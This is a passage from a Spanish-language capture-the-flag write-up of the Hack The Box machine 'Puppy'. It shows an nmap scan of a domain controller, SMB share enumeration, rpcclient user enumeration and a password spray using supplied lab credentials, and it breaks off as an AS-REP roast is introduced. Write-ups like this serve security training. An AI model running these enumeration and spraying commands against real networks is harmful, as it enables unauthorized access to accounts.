</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header</span><span class="p">:</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">HTTPAPI</span><span class="o">/</span><span class="mi">2</span><span class="o">.</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title</span><span class="p">:</span> <span class="no">Not</span> <span class="no">Found</span>
</span></span><span class="line"><span class="cl"><span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">mc</span><span class="o">-</span><span class="n">nmf</span>        <span class="o">.</span><span class="n">NET</span> <span class="no">Message</span> <span class="no">Framing</span>
</span></span><span class="line"><span class="cl"><span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">49669</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">49674</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span> <span class="n">over</span> <span class="no">HTTP</span> <span class="mi">1</span><span class="o">.</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="mi">49689</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">55651</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">55687</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="n">service</span> <span class="n">unrecognized</span> <span class="n">despite</span> <span class="n">returning</span> <span class="n">data</span><span class="o">.</span> <span class="no">If</span> <span class="n">you</span> <span class="n">know</span> <span class="n">the</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span><span class="p">,</span> <span class="n">please</span> <span class="n">submit</span> <span class="n">the</span> <span class="n">following</span> <span class="n">fingerprint</span> <span class="n">at</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">submit</span><span class="o">.</span><span class="n">cgi?</span><span class="kp">new</span><span class="o">-</span><span class="n">service</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">SF</span><span class="o">-</span><span class="no">Port53</span><span class="o">-</span><span class="ss">TCP</span><span class="p">:</span><span class="n">V</span><span class="o">=</span><span class="mi">7</span><span class="o">.</span><span class="mi">95</span><span class="o">%</span><span class="n">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="n">D</span><span class="o">=</span><span class="mi">10</span><span class="o">/</span><span class="mi">4</span><span class="o">%</span><span class="no">Time</span><span class="o">=</span><span class="mi">68</span><span class="no">E19A91</span><span class="o">%</span><span class="n">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="sr">%r(DNS-
</span></span></span><span class="line"><span class="cl"><span class="sr">SF:SD-TCP,30,&#34;\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
</span></span></span><span class="line"><span class="cl"><span class="sr">SF:_udp\x05local\0\0\x0c\0\x01&#34;)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="no">Service</span> <span class="ss">Info</span><span class="p">:</span> <span class="ss">Host</span><span class="p">:</span> <span class="no">DC</span><span class="p">;</span> <span class="ss">OS</span><span class="p">:</span> <span class="no">Windows</span><span class="p">;</span> <span class="ss">CPE</span><span class="p">:</span> <span class="ss">cpe</span><span class="p">:</span><span class="sr">/o:microsoft:windows
</span></span></span><span class="line"><span class="cl"><span class="sr">
</span></span></span><span class="line"><span class="cl"><span class="sr">Host script results:
</span></span></span><span class="line"><span class="cl"><span class="sr">| smb2-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="sr">|   3:1:1: 
</span></span></span><span class="line"><span class="cl"><span class="sr">|_    Message signing enabled and required
</span></span></span><span class="line"><span class="cl"><span class="sr">|_clock-skew: 6h59m59s
</span></span></span><span class="line"><span class="cl"><span class="sr">| smb2-time: 
</span></span></span><span class="line"><span class="cl"><span class="sr">|   date: 2025-10-05T05:07:48
</span></span></span><span class="line"><span class="cl"><span class="sr">|_  start_date: N/</span><span class="n">A</span></span></span></code></pre></div>
<p>Podemos apreciar que tiene muchos servicios corriendo(LDAP,SMB,RPC,Active Directory), como tenemos unas credenciales:</p>
<h4 id="credentialstxt">
  credentials.txt
  <a class="heading-link" href="#credentialstxt">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">levi.james / KingofAkron2025</span></span></code></pre></div>
<p>Estamos en la presencia de un <strong>Active Directory</strong>, por ende. Tenemos que a√±adir en nuestro <em>/etc/hosts</em> su direcci√≥n IP + Shortname + FDQN + Domain name. Primero hagamos un escaneo b√°sico al servicio <strong>smb</strong>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span></span></span></code></pre></div>
<p>Lo aplicamos a nuestro <em>/etc/hosts</em>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># echo -e &#39;# Puppy HTB\n10.10.11.70\tdc dc.puppy.htb puppy.htb&#39; &gt;&gt; /etc/hosts | cat /etc/hosts</span>
</span></span><span class="line"><span class="cl"><span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span>       <span class="n">localhost</span> <span class="n">quic</span><span class="o">.</span><span class="n">nagini</span><span class="o">.</span><span class="n">hogwarts</span>
</span></span><span class="line"><span class="cl"><span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">1</span>       <span class="n">kali</span>
</span></span><span class="line"><span class="cl"><span class="o">::</span><span class="mi">1</span>             <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span> 
</span></span><span class="line"><span class="cl"><span class="n">ff02</span><span class="o">::</span><span class="mi">1</span>         <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
</span></span><span class="line"><span class="cl"><span class="n">ff02</span><span class="o">::</span><span class="mi">2</span>         <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># DC Lab</span>
</span></span><span class="line"><span class="cl"><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">70</span><span class="o">.</span><span class="mi">139</span>  <span class="n">testcorp</span><span class="o">.</span><span class="n">local</span> <span class="n">testcorp</span> <span class="no">DC</span><span class="o">-</span><span class="no">Company</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># CTF&#39;s</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Puppy HTB</span>
</span></span><span class="line"><span class="cl"><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="n">dc</span> <span class="n">dc</span><span class="o">.</span><span class="n">puppy</span><span class="o">.</span><span class="n">htb</span> <span class="n">puppy</span><span class="o">.</span><span class="n">htb</span></span></span></code></pre></div>
<p>Probamos las credenciales en el servicio <strong>smb</strong>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;levi.james&#39;</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;KingofAkron2025!&#39;</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[+]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">levi</span><span class="o">.</span><span class="n">james</span><span class="ss">:KingofAkron2025!</span></span></span></code></pre></div>
<p>Enumeramos a ver si hay carpetas compartidas en el servidor <strong>smb</strong>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">smbmap</span> <span class="o">-</span><span class="n">H</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;levi.james&#39;</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;KingofAkron2025!&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">________</span>  <span class="n">___</span>      <span class="n">___</span>  <span class="n">_______</span>   <span class="n">___</span>      <span class="n">___</span>       <span class="n">__</span>         <span class="n">_______</span>
</span></span><span class="line"><span class="cl">   <span class="sr">/&#34;       )|&#34;  \    /</span><span class="s2">&#34;  ||   _  &#34;</span><span class="p">\</span> <span class="o">|</span><span class="s2">&#34;  \    /&#34;</span>  <span class="o">|</span>     <span class="sr">/&#34;&#34;\       |   __ &#34;\
</span></span></span><span class="line"><span class="cl"><span class="sr">  (:   \___/</span>  <span class="p">\</span>   <span class="p">\</span>  <span class="sr">//</span>   <span class="o">|</span><span class="p">(</span><span class="o">.</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span>  <span class="p">:)</span> <span class="p">\</span>   <span class="p">\</span>  <span class="sr">//</span>   <span class="o">|</span>    <span class="o">/</span>    <span class="p">\</span>      <span class="p">(</span><span class="o">.</span> <span class="o">|</span><span class="n">__</span><span class="p">)</span> <span class="p">:)</span>
</span></span><span class="line"><span class="cl">   <span class="p">\</span><span class="n">___</span>  <span class="p">\</span>    <span class="sr">/\  \/.    ||:     \/   /</span><span class="p">\</span>   <span class="p">\</span><span class="o">/.</span>    <span class="o">|</span>   <span class="sr">/&#39; /</span><span class="p">\</span>  <span class="p">\</span>     <span class="o">|</span><span class="p">:</span>  <span class="n">____</span><span class="o">/</span>
</span></span><span class="line"><span class="cl">    <span class="n">__</span><span class="o">/</span>  <span class="p">\</span>   <span class="o">|</span><span class="p">:</span> <span class="p">\</span><span class="o">.</span>        <span class="o">|</span><span class="p">(</span><span class="o">|</span>  <span class="n">_</span>  <span class="p">\</span>  <span class="o">|</span><span class="p">:</span> <span class="p">\</span><span class="o">.</span>        <span class="o">|</span>  <span class="sr">//</span>  <span class="n">__</span><span class="err">&#39;</span>  <span class="p">\</span>    <span class="p">(</span><span class="o">|</span>  <span class="o">/</span>
</span></span><span class="line"><span class="cl">   <span class="sr">/&#34; \   :) |.  \    /</span><span class="p">:</span>  <span class="o">||</span><span class="p">:</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span>  <span class="p">:)</span><span class="o">|.</span>  <span class="p">\</span>    <span class="sr">/:  | /</span>   <span class="o">/</span>  <span class="p">\</span>   <span class="p">\</span>  <span class="sr">/|__/</span> <span class="p">\</span>
</span></span><span class="line"><span class="cl">  <span class="p">(</span><span class="n">_______</span><span class="o">/</span>  <span class="o">|</span><span class="n">___</span><span class="o">|</span><span class="p">\</span><span class="n">__</span><span class="o">/|</span><span class="n">___</span><span class="o">|</span><span class="p">(</span><span class="n">_______</span><span class="o">/</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span><span class="p">\</span><span class="n">__</span><span class="o">/|</span><span class="n">___</span><span class="o">|</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>    <span class="p">\</span><span class="n">___</span><span class="p">)(</span><span class="n">_______</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">-----------------------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="no">SMBMap</span> <span class="o">-</span> <span class="no">Samba</span> <span class="no">Share</span> <span class="no">Enumerator</span> <span class="n">v1</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">7</span> <span class="o">|</span> <span class="no">Shawn</span> <span class="no">Evans</span> <span class="o">-</span> <span class="no">ShawnDEvans</span><span class="vi">@gmail</span><span class="o">.</span><span class="n">com</span>
</span></span><span class="line"><span class="cl">                     <span class="ss">https</span><span class="p">:</span><span class="sr">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="no">ShawnDEvans</span><span class="o">/</span><span class="n">smbmap</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Detected</span> <span class="mi">1</span> <span class="n">hosts</span> <span class="n">serving</span> <span class="no">SMB</span>                                                                                                  
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Established</span> <span class="mi">1</span> <span class="no">SMB</span> <span class="n">connections</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="ow">and</span> <span class="mi">1</span> <span class="n">authenticated</span> <span class="n">session</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>                                                          
</span></span><span class="line"><span class="cl">                                                                                                                             
</span></span><span class="line"><span class="cl"><span class="o">[+]</span> <span class="ss">IP</span><span class="p">:</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span><span class="p">:</span><span class="mi">445</span> <span class="ss">Name</span><span class="p">:</span> <span class="n">dc</span>                        <span class="ss">Status</span><span class="p">:</span> <span class="no">Authenticated</span>
</span></span><span class="line"><span class="cl">        <span class="no">Disk</span>                                                    <span class="no">Permissions</span>     <span class="no">Comment</span>
</span></span><span class="line"><span class="cl">        <span class="o">----</span>                                                    <span class="o">-----------</span>     <span class="o">-------</span>
</span></span><span class="line"><span class="cl">        <span class="no">ADMIN</span><span class="err">$</span>                                                  <span class="no">NO</span> <span class="no">ACCESS</span>       <span class="no">Remote</span> <span class="no">Admin</span>
</span></span><span class="line"><span class="cl">        <span class="n">C</span><span class="err">$</span>                                                      <span class="no">NO</span> <span class="no">ACCESS</span>       <span class="no">Default</span> <span class="n">share</span>
</span></span><span class="line"><span class="cl">        <span class="no">DEV</span>                                                     <span class="no">NO</span> <span class="no">ACCESS</span>       <span class="no">DEV</span><span class="o">-</span><span class="no">SHARE</span> <span class="k">for</span> <span class="no">PUPPY</span><span class="o">-</span><span class="no">DEVS</span>
</span></span><span class="line"><span class="cl">        <span class="no">IPC</span><span class="err">$</span>                                                    <span class="no">READ</span> <span class="no">ONLY</span>       <span class="no">Remote</span> <span class="no">IPC</span>
</span></span><span class="line"><span class="cl">        <span class="no">NETLOGON</span>                                                <span class="no">READ</span> <span class="no">ONLY</span>       <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
</span></span><span class="line"><span class="cl">        <span class="no">SYSVOL</span>                                                  <span class="no">READ</span> <span class="no">ONLY</span>       <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Closed</span> <span class="mi">1</span> <span class="n">connections</span></span></span></code></pre></div>
<p>Podemos visualizar que no tenemos acceso a la carpeta <strong>/DEV</strong> siendo levi.james, Como tenemos unas credenciales. Primero intentemos acceder al servidor a trav√©s de rpcclient con una sesi√≥n nula, se pudo pero no tenemos permisos para enumerar informaci√≥n de usuarios, con levi.james probemos:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="s1">&#39;levi.james%KingofAkron2025!&#39;</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>
</span></span><span class="line"><span class="cl"><span class="n">rpcclient</span> <span class="vg">$&gt;</span> <span class="n">enumdomusers</span>
</span></span><span class="line"><span class="cl"><span class="ss">user</span><span class="p">:</span><span class="o">[</span><span class="no">Administrator</span><span class="o">]</span> <span class="ss">rid</span><span class="p">:</span><span class="o">[</span><span class="mh">0x1f4</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="ss">user</span><span class="p">:</span><span class="o">[</span><span class="no">Guest</span><span class="o">]</span> <span class="ss">rid</span><span class="p">:</span><span class="o">[</span><span class="mh">0x1f5</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="ss">user</span><span class="p">:</span><span class="o">[</span><span class="n">krbtgt</span><span class="o">]</span> <span class="ss">rid</span><span class="p">:</span><span class="o">[</span><span class="mh">0x1f6</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="ss">user</span><span class="p">:</span><span class="o">[</span><span class="n">levi</span><span class="o">.</span><span class="n">james</span><span class="o">]</span> <span class="ss">rid</span><span class="p">:</span><span class="o">[</span><span class="mh">0x44f</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="ss">user</span><span class="p">:</span><span class="o">[</span><span class="n">ant</span><span class="o">.</span><span class="n">edwards</span><span class="o">]</span> <span class="ss">rid</span><span class="p">:</span><span class="o">[</span><span class="mh">0x450</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="ss">user</span><span class="p">:</span><span class="o">[</span><span class="n">adam</span><span class="o">.</span><span class="n">silver</span><span class="o">]</span> <span class="ss">rid</span><span class="p">:</span><span class="o">[</span><span class="mh">0x451</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="ss">user</span><span class="p">:</span><span class="o">[</span><span class="n">jamie</span><span class="o">.</span><span class="n">williams</span><span class="o">]</span> <span class="ss">rid</span><span class="p">:</span><span class="o">[</span><span class="mh">0x452</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="ss">user</span><span class="p">:</span><span class="o">[</span><span class="n">steph</span><span class="o">.</span><span class="n">cooper</span><span class="o">]</span> <span class="ss">rid</span><span class="p">:</span><span class="o">[</span><span class="mh">0x453</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="ss">user</span><span class="p">:</span><span class="o">[</span><span class="n">steph</span><span class="o">.</span><span class="n">cooper_adm</span><span class="o">]</span> <span class="ss">rid</span><span class="p">:</span><span class="o">[</span><span class="mh">0x457</span><span class="o">]</span></span></span></code></pre></div>
<p>Pudimos!, guardemos estos usuarios potenciales en un fichero .txt, para futuro reusar credenciales a ver si podemos pivotear en algo:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="s1">&#39;levi.james%KingofAkron2025!&#39;</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;enumdomusers&#39;</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">oP</span> <span class="s2">&#34;\[.*?\]&#34;</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="s2">&#34;0x&#34;</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> <span class="s1">&#39;[]&#39;</span> <span class="o">&gt;</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="no">Administrator</span>
</span></span><span class="line"><span class="cl"><span class="no">Guest</span>
</span></span><span class="line"><span class="cl"><span class="n">krbtgt</span>
</span></span><span class="line"><span class="cl"><span class="n">levi</span><span class="o">.</span><span class="n">james</span>
</span></span><span class="line"><span class="cl"><span class="n">ant</span><span class="o">.</span><span class="n">edwards</span>
</span></span><span class="line"><span class="cl"><span class="n">adam</span><span class="o">.</span><span class="n">silver</span>
</span></span><span class="line"><span class="cl"><span class="n">jamie</span><span class="o">.</span><span class="n">williams</span>
</span></span><span class="line"><span class="cl"><span class="n">steph</span><span class="o">.</span><span class="n">cooper</span>
</span></span><span class="line"><span class="cl"><span class="n">steph</span><span class="o">.</span><span class="n">cooper_adm</span></span></span></code></pre></div>
<p>Probemos reutilizar contrase√±a de levi.james con esos usuarios:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">u</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;KingofAkron2025!&#39;</span> <span class="o">--</span><span class="n">continue</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">success</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[-]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="ss">Administrator</span><span class="p">:</span><span class="no">KingofAkron2025</span><span class="o">!</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[-]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="ss">Guest</span><span class="p">:</span><span class="no">KingofAkron2025</span><span class="o">!</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[-]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="ss">krbtgt</span><span class="p">:</span><span class="no">KingofAkron2025</span><span class="o">!</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[+]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">levi</span><span class="o">.</span><span class="n">james</span><span class="ss">:KingofAkron2025!</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[-]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">ant</span><span class="o">.</span><span class="n">edwards</span><span class="ss">:KingofAkron2025!</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[-]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">adam</span><span class="o">.</span><span class="n">silver</span><span class="ss">:KingofAkron2025!</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[-]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">jamie</span><span class="o">.</span><span class="n">williams</span><span class="ss">:KingofAkron2025!</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[-]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">steph</span><span class="o">.</span><span class="n">cooper</span><span class="ss">:KingofAkron2025!</span> <span class="no">STATUS_LOGON_FAILURE</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[-]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">steph</span><span class="o">.</span><span class="n">cooper_adm</span><span class="ss">:KingofAkron2025!</span> <span class="no">STATUS_LOGON_FAILURE</span></span></span></code></pre></div>
<p>Nada.</p>
<p>Intentamos hacer un <strong>AS-REP</strong> Roast Attack, solicitando un TGT, sin la password del usuario a traves de los usuarios potenciales que tenemos:</p>
